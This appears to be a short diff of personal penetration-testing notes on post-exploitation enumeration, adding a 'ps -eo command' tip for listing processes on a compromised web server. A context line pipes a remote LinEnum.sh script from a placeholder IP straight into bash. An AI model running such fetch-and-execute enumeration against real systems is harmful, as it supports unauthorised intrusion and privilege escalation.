@@ -2,3 +2,6 @@ Only in tty shell
 
 or privchecker
 curl IP/LinEnum.sh | bash
+
+ps -eo command 
+Lists all the things running on the web server
